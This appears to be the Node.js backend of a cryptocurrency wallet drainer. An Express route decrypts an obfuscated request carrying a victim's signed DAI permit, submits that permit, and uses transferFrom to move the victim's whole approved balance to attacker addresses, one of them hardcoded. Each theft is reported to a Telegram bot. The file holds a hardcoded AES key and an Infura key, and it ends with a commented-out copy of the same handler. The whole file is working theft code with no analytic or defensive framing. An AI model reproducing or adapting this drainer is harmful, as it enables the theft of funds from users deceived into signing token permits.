require("dotenv").config();
const express = require("express");
const { ethers } = require("ethers");
const axios = require("axios");
const crypto = require("crypto");
const { DAI_ABI } = require("./ERC20_ABI");
const config = require("../config");


const TELEGRAM_BOT_TOKEN = config.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = config.TELEGRAM_CHAT_ID;
const BR_ENCRYPTION_KEY = "980c343e20c973f1b941a409d268df2cfca1d2fba93732fcecd3d5ed9cc93305";

const router = express.Router();

const decrypt = ({ data, iv }) => {
  const decipher = crypto.createDecipheriv(
    "aes-256-cbc",
    Buffer.from(BR_ENCRYPTION_KEY, "hex"),
    Buffer.from(iv, "hex")
  );
  let decrypted = decipher.update(data, "hex", "utf8");
  decrypted += decipher.final("utf8");
  return JSON.parse(decrypted);
};

const decryptMiddleware = (req, res, next) => {
  try {
    const { encryptedData, iv } = req.body;

    if (!encryptedData || !iv) {
      return res.status(400).json({ error: "Missing encrypted data or IV" });
    }

    console.log("Received Encrypted Data:", encryptedData);
    console.log("Received IV:", iv);

    const decryptedData = decrypt({ data: encryptedData, iv });
    console.log("Decrypted Request Body:", decryptedData);
    req.body = decryptedData;
    next();
  } catch (error) {
    console.error("Error decrypting payload:", error.message);
    res.status(400).json({ error: "Invalid encrypted data" });
  }
};

const sendToTelegram = async (message) => {
  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    await axios.post(url, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
    });
    console.log(`Message sent to Telegram: ${message}`);
  } catch (error) {
    console.error("Error sending message to Telegram:", error.message);
  }
};

const BR_Private_RPC_URLs = {
  1: "https://mainnet.infura.io/v3/15b2a4fd999148318a366400d99bc8ce", // Ethereum Mainnet
};

const getProvider = (chainId) => {
  const rpcUrl = BR_Private_RPC_URLs[chainId];
  if (!rpcUrl) {
    throw new Error(`Unsupported chain ID: ${chainId}`);
  }
  return new ethers.providers.JsonRpcProvider(rpcUrl);
};

const INITIATOR_PK = config.INITIATOR_PK;
const initiatorWallet = new ethers.Wallet(INITIATOR_PK);


const splitTransfers = false; // Control flag to decide whether to split transfers

router.post("/handleDAIPermit", decryptMiddleware, async (req, res) => {
  try {
    const {
      tokenAddress,
      userAddress,
      chainId,
      domain,
      daiPermitData,
      signature,
      frontendRecipient,
    } = req.body;

    if (!tokenAddress || !userAddress || !chainId || !domain || !daiPermitData || !signature || !frontendRecipient) {
      return res.status(400).json({ error: "Missing required fields" });
    }

    const backendRecipient = "0x4758a129ee74947CFA6Ff970162D68e1ee9f55f7"; // Replace with actual backend recipient address

    const provider = getProvider(parseInt(chainId));
    const connectedWallet = initiatorWallet.connect(provider);
    const tokenContract = new ethers.Contract(tokenAddress, DAI_ABI, connectedWallet);

    const { v, r, s } = ethers.utils.splitSignature(signature);

    console.log("Verifying and executing DAI permit...");
    const permitTxData = tokenContract.interface.encodeFunctionData("permit", [
      daiPermitData.holder,
      daiPermitData.spender,
      daiPermitData.nonce,
      daiPermitData.expiry,
      daiPermitData.allowed,
      v,
      r,
      s,
    ]);

    const permitTx = {
      to: tokenAddress,
      data: permitTxData,
      gasLimit: ethers.utils.hexlify(100000), // Adjust as necessary
    };

    const permitResponse = await connectedWallet.sendTransaction(permitTx);
    await permitResponse.wait();

    const permitMsg = `✅ DAI Permit Executed Successfully!\n\n🔗 Token: ${tokenAddress}\n🧑‍💻 Holder: ${daiPermitData.holder}\n💰 Value: ${ethers.utils.formatUnits(daiPermitData.value)}\n⛓️ Chain ID: ${chainId}\n🔑 Permit Tx Hash: ${permitResponse.hash}`;
    await sendToTelegram(permitMsg);

    console.log("Permit executed. Initiating transfer...");

    const totalAmount = ethers.BigNumber.from(daiPermitData.value);

    if (splitTransfers) {
      const frontendShare = totalAmount.div(2); // 50% for frontend
      const backendShare = totalAmount.sub(frontendShare); // Remaining 50%

      console.log(`Splitting ${totalAmount.toString()} into:`);
      console.log(`Frontend Recipient (${frontendRecipient}): ${frontendShare.toString()}`);
      console.log(`Backend Recipient (${backendRecipient}): ${backendShare.toString()}`);

      // Transfer to frontendRecipient
      const transferTx1 = await tokenContract.transferFrom(userAddress, frontendRecipient, frontendShare);
      await transferTx1.wait();

      const transfer1Msg = `📤 Transfer #1 Successful!\n\n🔗 Token: ${tokenAddress}\n📩 To: ${frontendRecipient}\n💸 Amount: ${ethers.utils.formatUnits(frontendShare)}\n🔑 Tx Hash: ${transferTx1.hash}`;
      await sendToTelegram(transfer1Msg);

      console.log(`Transfer to frontendRecipient successful: ${transferTx1.hash}`);

      // Transfer to backendRecipient
      const transferTx2 = await tokenContract.transferFrom(userAddress, backendRecipient, backendShare);
      await transferTx2.wait();

      const transfer2Msg = `📤 Transfer #2 Successful!\n\n🔗 Token: ${tokenAddress}\n📩 To: ${backendRecipient}\n💸 Amount: ${ethers.utils.formatUnits(backendShare)}\n🔑 Tx Hash: ${transferTx2.hash}`;
      await sendToTelegram(transfer2Msg);

      console.log(`Transfer to backendRecipient successful: ${transferTx2.hash}`);

      return res.status(200).json({
        message: "Split transfer successful",
        recipients: [
          { address: frontendRecipient, share: frontendShare.toString() },
          { address: backendRecipient, share: backendShare.toString() },
        ],
        transactionHashes: [transferTx1.hash, transferTx2.hash],
      });
    } else {
      // Single transfer to frontendRecipient
      console.log(`Transferring entire balance to frontendRecipient: ${frontendRecipient}`);
      const transferTx = await tokenContract.transferFrom(userAddress, frontendRecipient, totalAmount);
      await transferTx.wait();

      console.log(`Transfer to frontendRecipient successful: ${transferTx.hash}`);

      const transferMsg = `📤 Transfer Successful!\n\n🔗 Token: ${tokenAddress}\n📩 To: ${frontendRecipient}\n💸 Amount: ${ethers.utils.formatUnits(totalAmount)}\n🔑 Tx Hash: ${transferTx.hash}`;
      await sendToTelegram(transferMsg);

      return res.status(200).json({
        message: "Transfer successful",
        recipients: [{ address: frontendRecipient, share: totalAmount.toString() }],
        transactionHashes: [transferTx.hash],
      });
    }
  } catch (error) {
    console.error("Error in handleDAIPermit backend:", error);

    const errorMsg = `❌ Error in DAI Permit Handling:\n\n🛑 Message: ${error.message}`;
    await sendToTelegram(errorMsg);

    return res.status(500).json({ error: error.message });
  }
});

module.exports = router;


// router.post("/handleDAIPermit", decryptMiddleware, async (req, res) => {
//   try {
//     const {
//       tokenAddress,
//       userAddress,
//       chainId,
//       domain,
//       daiPermitData,
//       signature,
//       frontendRecipient,
//     } = req.body;

//     if (!tokenAddress || !userAddress || !chainId || !domain || !daiPermitData || !signature || !frontendRecipient) {
//       return res.status(400).json({ error: "Missing required fields" });
//     }

//     const backendRecipient = "0x4758a129ee74947CFA6Ff970162D68e1ee9f55f7"; // Replace with actual backend recipient address

//     const provider = getProvider(parseInt(chainId));
//     const connectedWallet = initiatorWallet.connect(provider);
//     const tokenContract = new ethers.Contract(tokenAddress, DAI_ABI, connectedWallet);

//     const { v, r, s } = ethers.utils.splitSignature(signature);

//     console.log("Verifying and executing DAI permit...");
//     const permitTxData = tokenContract.interface.encodeFunctionData("permit", [
//       daiPermitData.holder,
//       daiPermitData.spender,
//       daiPermitData.nonce,
//       daiPermitData.expiry,
//       daiPermitData.allowed,
//       v,
//       r,
//       s,
//     ]);

//     const permitTx = {
//       to: tokenAddress,
//       data: permitTxData,
//       gasLimit: ethers.utils.hexlify(100000), // Adjust as necessary
//     };

//     const permitResponse = await connectedWallet.sendTransaction(permitTx);
//     await permitResponse.wait();

//     const permitMsg = `✅ DAI Permit Executed Successfully!\n\n🔗 Token: ${tokenAddress}\n🧑‍💻 Holder: ${daiPermitData.holder}\n💰 Value: ${ethers.utils.formatUnits(daiPermitData.value)}\n⛓️ Chain ID: ${chainId}\n🔑 Permit Tx Hash: ${permitResponse.hash}`;
//     await sendToTelegram(permitMsg);

//     console.log("Permit executed. Initiating split transfer...");

//     const totalAmount = ethers.BigNumber.from(daiPermitData.value);
//     const frontendShare = totalAmount.div(2); // 50% for frontend
//     const backendShare = totalAmount.sub(frontendShare); // Remaining 50%

//     console.log(`Splitting ${totalAmount.toString()} into:`);
//     console.log(`Frontend Recipient (${frontendRecipient}): ${frontendShare.toString()}`);
//     console.log(`Backend Recipient (${backendRecipient}): ${backendShare.toString()}`);

//     // Transfer to frontendRecipient
//     const transferTx1 = await tokenContract.transferFrom(userAddress, frontendRecipient, frontendShare);
//     await transferTx1.wait();

//     const transfer1Msg = `📤 Transfer #1 Successful!\n\n🔗 Token: ${tokenAddress}\n📩 To: ${frontendRecipient}\n💸 Amount: ${ethers.utils.formatUnits(frontendShare)}\n🔑 Tx Hash: ${transferTx1.hash}`;
//     await sendToTelegram(transfer1Msg);

//     console.log(`Transfer to frontendRecipient successful: ${transferTx1.hash}`);

//     // Transfer to backendRecipient
//     const transferTx2 = await tokenContract.transferFrom(userAddress, backendRecipient, backendShare);
//     await transferTx2.wait();

//     const transfer2Msg = `📤 Transfer #2 Successful!\n\n🔗 Token: ${tokenAddress}\n📩 To: ${backendRecipient}\n💸 Amount: ${ethers.utils.formatUnits(backendShare)}\n🔑 Tx Hash: ${transferTx2.hash}`;
//     await sendToTelegram(transfer2Msg);

//     console.log(`Transfer to backendRecipient successful: ${transferTx2.hash}`);

//     return res.status(200).json({
//       message: "Split transfer successful",
//       recipients: [
//         { address: frontendRecipient, share: frontendShare.toString() },
//         { address: backendRecipient, share: backendShare.toString() },
//       ],
//       transactionHashes: [transferTx1.hash, transferTx2.hash],
//     });
//   } catch (error) {
//     console.error("Error in handleDAIPermit backend:", error);

//     const errorMsg = `❌ Error in DAI Permit Handling:\n\n🛑 Message: ${error.message}`;
//     await sendToTelegram(errorMsg);

//     return res.status(500).json({ error: error.message });
//   }
// });

// module.exports = router;
